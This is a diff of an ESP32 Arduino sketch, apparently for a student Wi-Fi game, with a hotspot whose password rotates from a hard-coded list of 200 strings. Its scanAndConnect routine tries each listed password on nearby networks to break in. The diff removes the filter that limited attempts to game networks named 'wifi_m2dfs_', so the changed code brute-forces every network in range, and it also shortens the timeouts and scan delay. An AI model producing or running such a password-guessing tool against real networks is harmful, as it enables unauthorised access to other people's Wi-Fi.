@@ -1,11 +1,14 @@
 #include <WiFi.h>
 
+#define TIMEOUT 1500 // Timeout pour chaque tentative en ms
+#define MAX_SUCCESS 10
+
 // SSID du hotspot et mot de passe initial
-const char* apSSID = "wifi_m2dfs_milan";
-char apPassword[32];  // Stocke le mot de passe actuel du hotspot
+const char *apSSID = "wifi_m2dfs_milan";
+char apPassword[32]; // Stocke le mot de passe actuel du hotspot
 
 // Liste des mots de passe possibles
-const char* passwords[] = {
+const char *passwords[] = {
     "kxzvaajn", "nulebozl", "sylmukyv", "fzxhzodw", "mnhfwylw", "xhnvtwdd", "jrulvtsp", "ochdamfa", "plaluafr", "ovnkkilc",
     "oizuxgas", "tjrdbrav", "pklzocye", "vtapalxp", "rtagjdnv", "frvuyeoe", "xghgxava", "rgolvnna", "yfxeqlny", "aewazmzb",
     "shsiejiu", "iuvmohlb", "cjvxdfsl", "qpikserq", "utacmzqp", "ooxevhdn", "sxthtwxj", "llrwdkcx", "ddudifar", "zphrewdm",
@@ -25,46 +28,49 @@ const char* passwords[] = {
     "cnuvswpy", "qitnplny", "wrjcumvb", "fmksndas", "cwotawuz", "lzkfjavt", "deshqjlv", "hfcrpmqj", "stgtdpmk", "nealxloj",
     "pqwygeet", "uuvqbkxw", "gyxuyioo", "rqkuzleq", "czuaaire", "pyxcaiqc", "exxysayd", "jajnriij", "nchoqudf", "uzexsnfm",
     "jajuagec", "rnutbptb", "ogvbnogl", "emwuzqan", "kcgzpxfo", "fhgjzrxe", "nrncgdsx", "cywwydif", "lyuzcaqv", "iwzzufyn",
-    "qbfjmlfi", "tdnsshfc", "kssrcayx", "ifykxdys", "bazausxn", "wahbnioc", "jvnqahyb", "jngbwrke", "nobrqqda", "qjoehftw"
-};
+    "qbfjmlfi", "tdnsshfc", "kssrcayx", "ifykxdys", "bazausxn", "wahbnioc", "jvnqahyb", "jngbwrke", "nobrqqda", "qjoehftw"};
 
 const int numPasswords = sizeof(passwords) / sizeof(passwords[0]);
 
 // Liste pour stocker les réseaux Wi-Fi connectés avec succès
-String successfulConnections[10];  // Limité à 10 pour cet exemple
+String successfulConnections[10]; // Limité à 10 pour cet exemple
 int successfulCount = 0;
 
-void changeHotspotPassword() {
+void changeHotspotPassword()
+{
     int randomIndex = random(0, numPasswords);
     strncpy(apPassword, passwords[randomIndex], sizeof(apPassword) - 1);
     apPassword[sizeof(apPassword) - 1] = '\0';
 
-    WiFi.softAP(apSSID, apPassword);  // Met à jour le hotspot avec un nouveau mot de passe
+    WiFi.softAP(apSSID, apPassword); // Met à jour le hotspot avec un nouveau mot de passe
     Serial.printf("Hotspot password changed to: %s 🔑\n", apPassword);
 }
 
-void WiFiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
-    switch (event) {
-        case WIFI_EVENT_AP_STACONNECTED:
-            Serial.println("Client connected, changing password... 🔄");
-            changeHotspotPassword();
-            break;
+void WiFiEvent(WiFiEvent_t event, WiFiEventInfo_t info)
+{
+    switch (event)
+    {
+    case WIFI_EVENT_AP_STACONNECTED:
+        Serial.println("Client connected, changing password... 🔄");
+        changeHotspotPassword();
+        break;
 
-        case WIFI_EVENT_AP_STADISCONNECTED:
-            Serial.println("Client disconnected 🚪");
-            break;
+    case WIFI_EVENT_AP_STADISCONNECTED:
+        Serial.println("Client disconnected 🚪");
+        break;
 
-        default:
-            break;
+    default:
+        break;
     }
 }
 
-void setup() {
+void setup()
+{
     Serial.begin(9600);
     Serial.println("Setting up Wi-Fi access point... 📶");
 
     randomSeed(analogRead(0)); // Initialise la génération de nombres aléatoires
-    changeHotspotPassword(); // Définit un mot de passe initial aléatoire
+    changeHotspotPassword();   // Définit un mot de passe initial aléatoire
 
     WiFi.onEvent(WiFiEvent); // Écoute les événements Wi-Fi
     WiFi.softAP(apSSID, apPassword);
@@ -73,9 +79,10 @@ void setup() {
     Serial.println(WiFi.softAPIP());
 }
 
-void loop() {
+void loop()
+{
     scanAndConnect();
-    delay(20000); // Attendre 20 secondes avant de refaire un scan ⏳
+    delay(5000); // Attendre seulement 5 sec avant de refaire un scan
 }
 
 void scanAndConnect() {
@@ -89,80 +96,54 @@ void scanAndConnect() {
 
     Serial.printf("✅ Found %d networks:\n", numNetworks);
 
-    // Filtrer les SSID qui correspondent à "wifi_m2dfs_****"
-    String targetSSIDs[numNetworks];
-    int targetCount = 0;
-
     for (int i = 0; i < numNetworks; i++) {
         String ssid = WiFi.SSID(i);
-        ssid.toLowerCase();  // Convertir le SSID en minuscules pour comparaison insensible à la casse
-        bool alreadyConnected = false;
 
-        // Vérifier si ce SSID est déjà dans la liste des connexions réussies
-        for (int j = 0; j < successfulCount; j++) {
-            if (ssid == successfulConnections[j]) {
-                alreadyConnected = true;
-                break;
-            }
+        if (isAlreadyConnected(ssid)) {
+            Serial.printf("✅ Already connected to %s, skipping...\n", ssid.c_str());
+            continue;
         }
 
-        if (!alreadyConnected && ssid.startsWith("wifi_m2dfs_")) {
-            targetSSIDs[targetCount++] = WiFi.SSID(i); // Conserver le SSID d'origine (en cas de connexion)
-        }
-    }
+        Serial.printf("📡 Target network: %s\n", ssid.c_str());
 
-    Serial.printf("🔒 Found %d target networks matching 'wifi_m2dfs_****'\n", targetCount);
-
-    if (targetCount == 0) {
-        Serial.println("❌ No matching networks found.");
-        return;
-    }
-
-    // Essayer chaque mot de passe sur tous les réseaux avant de passer au suivant
         for (int j = 0; j < numPasswords; j++) {
-        Serial.printf("🔑 Trying password: %s on all networks\n", passwords[j]);
+            Serial.printf("🔑 Trying password (%d/%d): %s\n", j + 1, numPasswords, passwords[j]);
 
-        for (int i = 0; i < targetCount; i++) {
-            Serial.printf("💻 Trying to connect to %s with password %s...\n", targetSSIDs[i].c_str(), passwords[j]);
+            WiFi.disconnect(true);
+            delay(100);
 
-            WiFi.begin(targetSSIDs[i].c_str(), passwords[j]);
+            WiFi.begin(ssid.c_str(), passwords[j]);
             unsigned long startTime = millis();
 
-            while (millis() - startTime < 10000) { // Timeout de 10 sec
+            while (millis() - startTime < TIMEOUT) {
                 if (WiFi.status() == WL_CONNECTED) {
-                Serial.printf("🎉 Connected successfully to %s!\n", targetSSIDs[i].c_str());
-                Serial.printf("🌐 IP Address: %s\n", WiFi.localIP().toString().c_str());
+                    Serial.printf("🎉 Connected successfully to %s!\n", ssid.c_str());
+                    Serial.printf("🌐 IP Address: %s\n", WiFi.localIP().toString().c_str());
 
-                // Ajouter ce réseau à la liste des connexions réussies
-                if (successfulCount < 10) {
-                    successfulConnections[successfulCount++] = targetSSIDs[i];
+                    addSuccessfulConnection(ssid);
+                    WiFi.disconnect();
+                    return; // Arrêter après une connexion réussie
                 }
-
-                // Afficher la liste des connexions réussies
-                Serial.println("✅ Successfully connected to the following networks:");
-                for (int k = 0; k < successfulCount; k++) {
-                    Serial.printf("%d. %s\n", k + 1, successfulConnections[k].c_str());
-                }
-
-                    // Retirer ce réseau de la liste des réseaux à essayer
-                    for (int k = i; k < targetCount - 1; k++) {
-                        targetSSIDs[k] = targetSSIDs[k + 1];
-                    }
-                    targetCount--;  // Réduire le nombre de réseaux à tester
-                WiFi.disconnect();  // Se déconnecter du réseau courant
-                    delay(4000); // Attendre avant de tester les autres
-                    break;
-                }
-                delay(500);
             }
-
-                Serial.println("❌ Incorrect password! Trying next... 🔄");
-                WiFi.disconnect();
-            delay(4000); // Délai de 4 secondes avant de tester le prochain réseau
+            Serial.println("❌ Incorrect password! Trying next... 🔄");
         }
     }
-
-    WiFi.scanDelete(); // Libère la mémoire après le scan
 }
 
+bool isAlreadyConnected(String ssid) {
+    for (int i = 0; i < successfulCount; i++) {
+        if (successfulConnections[i] == ssid) return true;
+    }
+    return false;
+}
 
+void addSuccessfulConnection(String ssid) {
+    if (successfulCount < MAX_SUCCESS) {
+        successfulConnections[successfulCount++] = ssid;
+    }
+
+    Serial.println("✅ Successfully connected to the following networks:");
+    for (int i = 0; i < successfulCount; i++) {
+        Serial.printf("%d. %s\n", i + 1, successfulConnections[i].c_str());
+    }
+}
